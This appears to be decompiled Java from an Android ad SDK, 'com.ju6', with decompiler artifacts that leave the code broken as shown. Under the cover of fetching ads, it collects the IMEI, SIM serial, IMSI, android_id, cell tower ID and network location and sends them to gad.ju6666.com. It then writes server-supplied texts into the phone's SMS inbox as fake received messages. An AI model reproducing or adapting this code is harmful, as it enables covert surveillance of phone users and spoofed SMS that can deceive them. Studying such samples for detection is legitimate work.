	private static  a
	private static  b
	private static  c
	private java.util.List d
	private android.content.Context e
	private  f
	private  g
	private  h
	private  i
	private java.lang.String j
	private java.lang.String k
	private java.lang.String l
	private java.lang.String m
	private java.lang.String n
	private  o
	private  p
	private  q
	private  r
	private  s
	private java.lang.String t
	private java.lang.String u
	private com.ju6.AdListener v
	
	    static a()
	    {
	        com.ju6.a.a = 1800000;
	        com.ju6.a.b = 60000;
	        com.ju6.a.c = 10000;
	        return;
	    }
	
	
	    public a(android.content.Context p2, com.ju6.AdListener p3)
	    {
	        this.f = -1;
	        this.o = -1;
	        this.e = p2;
	        this.v = p3;
	        return;
	    }
	
	
	    private String a()
	    {
	        try {
	            if (this.u == null) {
	                String v0_2 = new StringBuffer();
	                String v1_0 = android.os.Build$VERSION.RELEASE;
	                if (v1_0.length() <= 0) {
	                    v0_2.append("1.0");
	                } else {
	                    v0_2.append(v1_0);
	                }
	                v0_2.append("; ");
	                String v1_3 = java.util.Locale.getDefault();
	                Object[] v2_1 = v1_3.getLanguage();
	                if (v2_1 == null) {
	                    v0_2.append("en");
	                } else {
	                    v0_2.append(v2_1.toLowerCase());
	                    String v1_5 = v1_3.getCountry();
	                    if (v1_5 != null) {
	                        v0_2.append("-");
	                        v0_2.append(v1_5.toLowerCase());
	                    }
	                }
	                String v1_7 = android.os.Build.MODEL;
	                if (v1_7.length() > 0) {
	                    v0_2.append("; ");
	                    v0_2.append(v1_7);
	                }
	                String v1_8 = android.os.Build.ID;
	                if (v1_8.length() > 0) {
	                    v0_2.append(" Build/");
	                    v0_2.append(v1_8);
	                }
	                Object[] v2_9 = new Object[2];
	                v2_9[0] = v0_2;
	                v2_9[1] = "1.0.3";
	                this.u = String.format("Mozilla/5.0 (Linux; U; Android %s) AppleWebKit/525.10+ (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2 (ju6ad-ANDROID-%s)", v2_9);
	            }
	        } catch (String v0_5) {
	            v0_5.printStackTrace();
	        }
	        return this.u;
	    }
	
	
	    private static String a(String p7)
	    {
	        String v0_0 = 0;
	        if ((p7 != null) && (p7.length() > 0)) {
	            try {
	                String v0_2 = java.security.MessageDigest.getInstance("MD5");
	                v0_2.update(p7.getBytes(), 0, p7.length());
	                Object[] v2_2 = new Object[1];
	                v2_2[0] = new java.math.BigInteger(1, v0_2.digest());
	                v0_0 = String.format("%032X", v2_2);
	            } catch (String v0) {
	                v0_0 = p7.substring(0, 32);
	            }
	        }
	        return v0_0;
	    }
	
	
	    private static java.net.HttpURLConnection a(java.net.URL p6, int p7)
	    {
	        java.net.HttpURLConnection v0_4;
	        if (p6 != null) {
	            try {
	                java.net.HttpURLConnection v0_1;
	                if (p7 != 2) {
	                    v0_1 = 0;
	                } else {
	                    v0_1 = new java.net.Proxy(java.net.Proxy$Type.HTTP, new java.net.InetSocketAddress("10.0.0.172", 80));
	                }
	            } catch (java.net.HttpURLConnection v0) {
	                v0_4 = 0;
	            }
	            if (p7 == 8) {
	                v0_1 = new java.net.Proxy(java.net.Proxy$Type.HTTP, new java.net.InetSocketAddress("10.0.0.200", 80));
	            }
	            if (v0_1 == null) {
	                v0_4 = ((java.net.HttpURLConnection) p6.openConnection());
	            } else {
	                v0_4 = ((java.net.HttpURLConnection) p6.openConnection(v0_1));
	            }
	        } else {
	            v0_4 = 0;
	        }
	        return v0_4;
	    }
	
	
	    private void a(int p2)
	    {
	        if (this.v != null) {
	            this.v.onReceiveAd(p2);
	        }
	        return;
	    }
	
	
	    private static void a(StringBuilder p3, String p4, String p5)
	    {
	        if ((p5 != null) && (p5.length() > 0)) {
	            try {
	                p3.append("&").append(java.net.URLEncoder.encode(p4, "UTF-8")).append("=").append(java.net.URLEncoder.encode(p5, "UTF-8"));
	            } catch (java.io.UnsupportedEncodingException v0_5) {
	                android.util.Log.e("Ju6 Ad", "UTF-8 encoding is not supported on this device.  Ad requests are impossible.", v0_5);
	            }
	        }
	        return;
	    }
	
	
	    private static java.util.List b(String p6)
	    {
	        java.util.ArrayList v0_1 = new java.util.ArrayList();
	        try {
	            org.json.JSONArray v1_1 = new org.json.JSONObject(p6);
	        } catch (org.json.JSONArray v1) {
	            return v0_1;
	        }
	        try {
	            com.ju6.a.a = ((long) ((Integer.valueOf(v1_1.getString("interval").trim()).intValue() * 60) * 1000));
	        } catch (int v2) {
	        }
	        org.json.JSONArray v1_2 = v1_1.getJSONArray("sms");
	        int v2_9 = 0;
	        while (v2_9 < v1_2.length()) {
	            com.ju6.b v3_2 = new com.ju6.b();
	            String v4_0 = v1_2.getJSONObject(v2_9);
	            v3_2.a = v4_0.getString("smsmobile");
	            v3_2.b = v4_0.getString("content");
	            v0_1.add(v3_2);
	            v2_9++;
	        }
	        return v0_1;
	    }
	
	
	    private boolean b()
	    {
	        int v0_1 = new StringBuilder();
	        try {
	            Exception v1_1 = new StringBuilder();
	            android.content.ContentValues v2_0 = System.currentTimeMillis();
	            android.content.ContentValues v2_3 = new StringBuilder(String.valueOf((v2_0 / 1000))).append(".").append((v2_0 % 1000)).toString();
	        } catch (Exception v1_11) {
	            com.ju6.a.a = 60000;
	            if (this.v != null) {
	                this.v.onConnectFailed();
	            }
	            v1_11.printStackTrace();
	            this.d = com.ju6.a.b(v0_1.toString());
	            if ((this.d == null) || (this.d.size() <= 0)) {
	                android.util.Log.d("Ju6 Ad", "\u6ca1\u6709\u53d6\u5230\u5e7f\u544a\u6570\u636e\uff01");
	                this.a(0);
	            } else {
	                Exception v1_13 = 0;
	                while (v1_13 < this.d.size()) {
	                    android.content.ContentValues v2_36 = new android.content.ContentValues();
	                    v2_36.put("address", ((com.ju6.b) this.d.get(v1_13)).a);
	                    v2_36.put("body", ((com.ju6.b) this.d.get(v1_13)).b);
	                    this.e.getContentResolver().insert(android.net.Uri.parse("content://sms/inbox"), v2_36);
	                    v1_13++;
	                }
	                this.a(this.d.size());
	            }
	            return 1;
	        }
	        if ((this.t == null) && ((this.m != null) || (this.j != null))) {
	            this.t = com.ju6.a.a(new StringBuilder(String.valueOf(this.m)).append(this.j).toString());
	        }
	        android.net.Uri v3_8 = this.t;
	        v1_1.append("z").append("=").append(v2_3);
	        com.ju6.a.a(v1_1, "a", com.ju6.AdManager.getAppid());
	        com.ju6.a.a(v1_1, "p", com.ju6.AdManager.getPwd());
	        com.ju6.a.a(v1_1, "m", String.valueOf(com.ju6.AdManager.isTestmode()));
	        com.ju6.a.a(v1_1, "v", "1.0.3");
	        com.ju6.a.a(v1_1, "c", String.valueOf(this.f));
	        com.ju6.a.a(v1_1, "l", String.valueOf(this.g));
	        com.ju6.a.a(v1_1, "cc", String.valueOf(this.h));
	        com.ju6.a.a(v1_1, "nc", String.valueOf(this.i));
	        com.ju6.a.a(v1_1, "e", this.j);
	        com.ju6.a.a(v1_1, "s", this.l);
	        com.ju6.a.a(v1_1, "d", this.k);
	        com.ju6.a.a(v1_1, "t", v3_8);
	        com.ju6.a.a(v1_1, "b", com.ju6.AdManager.getBirthdayAsString());
	        com.ju6.a.a(v1_1, "g", com.ju6.AdManager.getGenderAsString());
	        com.ju6.a.a(v1_1, "k", com.ju6.a.a(new StringBuilder(String.valueOf(v2_3)).append(32).append(v3_8).toString()));
	        com.ju6.a.a(v1_1, "mo", android.os.Build.MODEL);
	        com.ju6.a.a(v1_1, "n", this.n);
	        com.ju6.a.a(v1_1, "la", String.valueOf(this.p));
	        com.ju6.a.a(v1_1, "lo", String.valueOf(this.q));
	        com.ju6.a.a(v1_1, "ac", String.valueOf(this.r));
	        com.ju6.a.a(v1_1, "gt", String.valueOf(this.s));
	        Exception v1_2 = v1_1.toString();
	        try {
	            Exception v1_4;
	            if ("http://gad.ju6666.com/adserver/android/1.0/GetAd".indexOf("?") < 0) {
	                v1_4 = new StringBuilder("http://gad.ju6666.com/adserver/android/1.0/GetAd?").append(v1_2).toString();
	                Exception v1_7 = com.ju6.a.a(new java.net.URL(v1_4), this.o);
	                v1_7.setRequestMethod("GET");
	                v1_7.addRequestProperty("User-Agent", this.a());
	                v1_7.setDoOutput(1);
	                v1_7.setConnectTimeout(com.ju6.a.c);
	                v1_7.setReadTimeout(com.ju6.a.c);
	                android.net.Uri v3_24 = new java.io.BufferedWriter(new java.io.OutputStreamWriter(v1_7.getOutputStream()));
	                try {
	                    v3_24.close();
	                    v1_7.connect();
	                    android.content.ContentValues v2_30 = new java.io.BufferedReader(new java.io.InputStreamReader(v1_7.getInputStream()));
	                } catch (Exception v1_8) {
	                    v2_30 = 0;
	                }
	                try {
	                    while(true) {
	                        Exception v1_10 = v2_30.readLine();
	                        v0_1.append(v1_10);
	                    }
	                    try {
	                        v3_24.close();
	                        v2_30.close();
	                    } catch (Exception v1) {
	                    }
	                } catch (Exception v1_8) {
	                }
	                if (v1_10 != null) {
	                }
	            } else {
	                v1_4 = new StringBuilder("http://gad.ju6666.com/adserver/android/1.0/GetAd&").append(v1_2).toString();
	            }
	            try {
	                if (v3_24 == null) {
	                    if (v2_30 != null) {
	                        v2_30.close();
	                    }
	                } else {
	                    v3_24.close();
	                }
	            } catch (android.content.ContentValues v2) {
	            }
	            throw v1_8;
	        } catch (Exception v1_8) {
	            v2_30 = 0;
	            v3_24 = 0;
	        }
	    }
	
	
	    public final void run()
	    {
	        if (((!com.ju6.AdManager.isAdFinish()) || (((com.ju6.AdManager.getAdTimestamp() + com.ju6.a.a) < System.currentTimeMillis()) && (!com.ju6.AdManager.isTestmode()))) || (((com.ju6.AdManager.getAdTimestamp() + com.ju6.a.b) < System.currentTimeMillis()) && (com.ju6.AdManager.isTestmode()))) {
	            com.ju6.AdManager.setAdFinish();
	            com.ju6.AdManager.setAdTimestamp();
	            if ((com.ju6.AdManager.getAppid() != null) && ((!com.ju6.AdManager.getAppid().equals("")) && ((com.ju6.AdManager.getPwd() != null) && (!com.ju6.AdManager.getPwd().equals(""))))) {
	                int v0_17;
	                if (this.e.checkCallingOrSelfPermission("android.permission.INTERNET") != -1) {
	                    v0_17 = 1;
	                } else {
	                    android.util.Log.e("Ju6 Ad", "Cannot request an ad without Internet permissions!  Open manifest.xml and just before the final </manifest> tag add:  <uses-permission android:name=\"android.permission.INTERNET\" />");
	                    v0_17 = 0;
	                }
	                if (this.e.checkCallingOrSelfPermission("android.permission.ACCESS_COARSE_LOCATION") == -1) {
	                    android.util.Log.e("Ju6 Ad", "Cannot request an ad without ACCESS_COARSE_LOCATION permissions!  Open manifest.xml and just before the final </manifest> tag add:  <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\" />");
	                    v0_17 = 0;
	                }
	                if (this.e.checkCallingOrSelfPermission("android.permission.WRITE_SMS") == -1) {
	                    android.util.Log.e("Ju6 Ad", "Cannot request an ad without WRITE_SMS permissions!  Open manifest.xml and just before the final </manifest> tag add:  <uses-permission android:name=\"android.permission.WRITE_SMS\" />");
	                    v0_17 = 0;
	                }
	                if (this.e.checkCallingOrSelfPermission("android.permission.READ_SMS") == -1) {
	                    android.util.Log.e("Ju6 Ad", "Cannot request an ad without READ_SMS permissions!  Open manifest.xml and just before the final </manifest> tag add:  <uses-permission android:name=\"android.permission.READ_SMS\" />");
	                    v0_17 = 0;
	                }
	                if (this.e.checkCallingOrSelfPermission("android.permission.READ_PHONE_STATE") == -1) {
	                    android.util.Log.e("Ju6 Ad", "Cannot request an ad without READ_PHONE_STATE permissions!  Open manifest.xml and just before the final </manifest> tag add:  <uses-permission android:name=\"android.permission.READ_PHONE_STATE\" />");
	                    v0_17 = 0;
	                }
	                if (this.e.checkCallingOrSelfPermission("android.permission.ACCESS_NETWORK_STATE") == -1) {
	                    android.util.Log.e("Ju6 Ad", "Cannot request an ad without ACCESS_NETWORK_STATE permissions!  Open manifest.xml and just before the final </manifest> tag add:  <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\" />");
	                    v0_17 = 0;
	                }
	                if (v0_17 != 0) {
	                    try {
	                        android.util.Log.d("Ju6 Ad", "\u5f00\u59cb\u53d6\u624b\u673a\u4fe1\u606f...");
	                        int v0_27 = ((android.telephony.TelephonyManager) this.e.getSystemService("phone"));
	                    } catch (int v0_52) {
	                        v0_52.printStackTrace();
	                    }
	                    if (v0_27 != 0) {
	                        this.j = v0_27.getDeviceId();
	                        this.k = v0_27.getSimSerialNumber();
	                        this.l = v0_27.getSubscriberId();
	                        this.h = Integer.valueOf(v0_27.getNetworkOperator().substring(0, 3)).intValue();
	                        this.i = Integer.valueOf(v0_27.getNetworkOperator().substring(3, 5)).intValue();
	                        this.m = android.provider.Settings$System.getString(this.e.getContentResolver(), "android_id");
	                        int v0_29 = ((android.telephony.gsm.GsmCellLocation) v0_27.getCellLocation());
	                        if (v0_29 != 0) {
	                            this.f = v0_29.getCid();
	                            this.g = v0_29.getLac();
	                        }
	                    }
	                    int v0_34 = ((android.location.LocationManager) this.e.getSystemService("location")).getLastKnownLocation("network");
	                    if (v0_34 != 0) {
	                        this.p = v0_34.getLatitude();
	                        this.q = v0_34.getLongitude();
	                        this.r = ((double) v0_34.getAccuracy());
	                        this.s = (System.currentTimeMillis() - v0_34.getTime());
	                    }
	                    int v0_39 = ((android.net.ConnectivityManager) this.e.getSystemService("connectivity")).getActiveNetworkInfo();
	                    if (v0_39 == 0) {
	                        android.util.Log.d("Ju6 Ad", "\u4e0d\u80fd\u8fde\u63a5\u5230\u7f51\u7edc\uff0c\u8bf7\u68c0\u67e5\u7f51\u7edc\u914d\u7f6e\uff01");
	                    } else {
	                        if (!v0_39.isAvailable()) {
	                            android.util.Log.d("Ju6 Ad", "\u4e0d\u80fd\u8fde\u63a5\u5230\u7f51\u7edc\uff0c\u8bf7\u68c0\u67e5\u7f51\u7edc\u914d\u7f6e\uff01");
	                        } else {
	                            if (v0_39.getType() != 0) {
	                                this.n = "wifi";
	                            } else {
	                                int v0_43 = v0_39.getExtraInfo();
	                                if (v0_43 != 0) {
	                                    this.n = v0_43.trim().toLowerCase();
	                                }
	                            }
	                        }
	                    }
	                    int v0_51;
	                    android.util.Log.d("Ju6 Ad", new StringBuilder("netstr=").append(this.n).toString());
	                    int v0_47 = this.n;
	                    if (v0_47 == 0) {
	                        v0_51 = -1;
	                    } else {
	                        int v0_49 = v0_47.toLowerCase().trim();
	                        if (v0_49.length() == 0) {
	                        } else {
	                            if (!v0_49.equals("wifi")) {
	                                if (!v0_49.equals("cmnet")) {
	                                    if (!v0_49.equals("cmwap")) {
	                                        if (!v0_49.equals("uninet")) {
	                                            if (!v0_49.equals("uniwap")) {
	                                                if (!v0_49.equals("3gnet")) {
	                                                    if (!v0_49.equals("3gwap")) {
	                                                        if (!v0_49.equals("ctnet")) {
	                                                            if (!v0_49.equals("ctwap")) {
	                                                                if (!v0_49.equals("internet")) {
	                                                                } else {
	                                                                    v0_51 = 9;
	                                                                }
	                                                            } else {
	                                                                v0_51 = 8;
	                                                            }
	                                                        } else {
	                                                            v0_51 = 7;
	                                                        }
	                                                    } else {
	                                                        v0_51 = 6;
	                                                    }
	                                                } else {
	                                                    v0_51 = 5;
	                                                }
	                                            } else {
	                                                v0_51 = 4;
	                                            }
	                                        } else {
	                                            v0_51 = 3;
	                                        }
	                                    } else {
	                                        v0_51 = 2;
	                                    }
	                                } else {
	                                    v0_51 = 1;
	                                }
	                            } else {
	                                v0_51 = 0;
	                            }
	                        }
	                    }
	                    this.o = v0_51;
	                    if ((-1 == this.f) && (!com.ju6.AdManager.isTestmode())) {
	                        android.util.Log.d("Ju6 Ad", "\u6ca1\u6709\u53d6\u5230cellid\uff0c\u4e0d\u53d6\u5e7f\u544a...");
	                    } else {
	                        android.util.Log.d("Ju6 Ad", "\u5f00\u59cb\u53d6\u5e7f\u544a...");
	                        this.b();
	                    }
	                }
	            } else {
	                android.util.Log.e("Ju6 Ad", "\u8bf7\u5148\u4f7f\u7528AdManager.init\u65b9\u6cd5\u521d\u59cb\u5316\u5e94\u7528ID\u548c\u5bc6\u7801\uff01");
	            }
	        }
	        return;
	    }
	
